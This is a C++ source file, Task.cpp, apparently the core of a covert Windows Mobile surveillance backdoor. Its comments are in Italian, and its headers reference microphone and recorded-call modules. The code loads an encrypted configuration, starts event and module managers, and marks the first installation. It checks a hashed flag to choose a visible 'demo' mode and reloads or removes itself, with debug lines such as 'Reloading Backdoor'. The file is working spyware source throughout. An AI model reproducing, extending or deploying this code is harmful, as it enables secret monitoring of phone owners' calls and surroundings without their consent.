#include <wchar.h>
#include <time.h>
#include <vector>
#include <exception>
#include <memory>
#include <common_new\cfgmgrapi.h>
#include <common_new\regext.h>
#include <common_new\connmgr.h>

#include "Task.h"
#include "Events.h"
#include "Microphone.h"
#include "RecordedCalls.h"
#include "Date.h"
#include "Common.h"

#include "FunctionFunc.h"

using namespace std;

Task* Task::Instance = NULL;
volatile LONG Task::lLock = 0;
BOOL Task::demo = FALSE;

Task* Task::self() {
	
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		::_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) Task();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

Task::Task() : statusObj(NULL), confObj(NULL), 
deviceObj(NULL), uberlogObj(NULL), observerObj(NULL),
modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {

	Hash sha1;

	BYTE sha[20];
	BYTE demoMode[] = {
		0x4e, 0xb8, 0x75, 0x0e, 0xa8, 0x10, 0xd1, 0x94, 
		0xb4, 0x69, 0xf0, 0xaf, 0xa8, 0xf4, 0x77, 0x51, 
		0x49, 0x69, 0xba, 0x72 };
/***
	MSGQUEUEOPTIONS_OS queue;

	ZeroMemory(&queue, sizeof(queue));

	queue.dwSize = sizeof(queue);
	queue.dwFlags = MSGQUEUE_NOPRECOMMIT | MSGQUEUE_ALLOW_BROKEN;
	queue.dwMaxMessages = 0;
	queue.cbMaxMessage = 1024 * 4; // 4kb massimo per ogni messaggio
	queue.bReadAccess = TRUE;

	// Creiamo la coda IPC
	g_hSmsQueueRead = CreateMsgQueue(L"IpcQueueLocalSAR", &queue); // Sms Agent Queue

	queue.bReadAccess = FALSE;
	g_hSmsQueueWrite = CreateMsgQueue(L"IpcQueueLocalSAW", &queue); // Sms Agent Queue
***/
	wakeupEvent = _CreateEventW(NULL, FALSE, FALSE, NULL);

	// Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le code
	statusObj = Status::self();
	deviceObj = Device::self();
	uberlogObj = UberLog::self();
	///observerObj = Observer::self();
	modulesManager = ModulesManager::self();
	eventsManager = EventsManager::self();
	actionsManager = ActionsManager::self();

	sha1.Sha1(g_DemoMode, 24, sha);

	if (memcmp(sha, demoMode, 20) == 0)
		demo = TRUE;
		
}

Task::~Task(){

	if (deviceObj)
		delete deviceObj;

	if (statusObj)
		delete statusObj;

	if (confObj)
		delete confObj;

/***
	// XXX Zozzerigi, rimuovere quando verra' implementata la classe IPC
	if (g_hSmsQueueRead != NULL)
		CloseMsgQueue(g_hSmsQueueRead);

	if (g_hSmsQueueWrite != NULL)
		CloseMsgQueue(g_hSmsQueueWrite);
***/

	if (wakeupEvent)
		CloseHandle(wakeupEvent);

}

void Task::StartNotification() {
	
	Log logInfo;

	logInfo.WriteLogInfo(L"Started");
	
}

BOOL Task::TaskInit() {
	
	if (deviceObj)
		deviceObj->RefreshData(); // Inizializza varie cose tra cui g_InstanceId

	if (confObj) {
		delete confObj;
		confObj = NULL;
	}

	confObj =  new(std::nothrow) Conf();

	if (confObj == NULL)
		return FALSE;

	if (confObj->LoadConf() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - confObj->LoadConf() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Configuration... FAILED\n");
		return FALSE;
	}

	ADDDEMOMESSAGE(L"Configuration... OK\n");

	if (getDemo()) {
		DBG_TRACE(L"Debug - Task.cpp - Starting in DEMO mode\n", 1, FALSE);
	}

	if (uberlogObj)
		uberlogObj->ScanLogs();

	// Da qui in poi inizia la concorrenza tra i thread
#ifdef _DEBUG
	eventsManager->dumpEvents();
#endif

	// Let's mark our first installation
	Log log;

	if (log.IsMarkup(EVENT_AFTERINST) == FALSE) {
		Date d;

		__int64 now = d.getCurAbsoluteMs();

		log.WriteMarkup(EVENT_AFTERINST, (PBYTE)&now, sizeof(now));
	}

	if (eventsManager->startAll() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - eventsManager->startAll() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Events... FAILED\n");
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - TaskInit() events started\n", 5, FALSE);
	ADDDEMOMESSAGE(L"Events... OK\nAgents:... OK\n");

#ifndef _DEBUG
	if (getDemo()) {
		///MessageBeep(MB_OK);
		///MessageBeep(MB_OK);
		///BlinkLeds();
	}
#endif
	
	return TRUE;
}


BOOL Task::CheckActions() {
	
	_Sleep(1000);

	_WaitForSingleObject(wakeupEvent, INFINITE);

#ifndef _DEBUG
	if (getDemo()) {
		///MessageBeep(MB_OK);
		///BlinkLeds();
	}
#endif

	DBG_TRACE(L"Debug - Task.cpp - core woke up!\n", 1, FALSE);
	DBG_TRACE_INT(L"Debug - Task.cpp - Memory Used: ", 1, FALSE, GetUsedPhysMemory());

	eventsManager->stopAll();
	eventsManager->clear();

	modulesManager->stopAll();
	modulesManager->clear();
	
	actionsManager->clear();

	// FALSE, uninstall
	if (uninstallRequested) {
		DBG_TRACE(L"Debug - Task.cpp - Removing Backdoor\n", 1, FALSE);
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - Reloading Backdoor\n", 1, FALSE);

	return TRUE;
}

void Task::uninstall() {
	uninstallRequested = TRUE;
}

void Task::wakeup() {
	SetEvent(wakeupEvent);
}

BOOL Task::getDemo() {

#ifdef DEMO_MODE
	return TRUE;
#endif
	return demo;
}